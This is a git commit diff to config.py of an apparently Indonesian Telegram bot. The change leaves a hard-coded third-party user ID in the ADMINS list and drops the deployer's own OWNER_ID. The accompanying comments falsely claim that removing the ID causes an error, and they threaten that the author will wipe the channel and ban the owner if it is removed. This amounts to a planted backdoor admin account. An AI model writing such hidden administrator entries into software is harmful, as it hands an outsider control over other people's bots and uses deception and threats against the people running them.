c1ffb914e8786f3dd5a37fad49cc0301ff9a6e66
zer-Pyro <143489626+zergiiorvdra@users.noreply.github.com>
2023-09-21 10:33:08 +0700

    Update config.py

--- config.py
+++ config.py
@@ -70,7 +70,7 @@ DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "Fal
 
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
 # Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
-ADMINS.extend((OWNER_ID, 1754029718, 1754029718))
+ADMINS.extend((1754029718, 1754029718))
 
 
 LOG_FILE_NAME = "logs.txt"
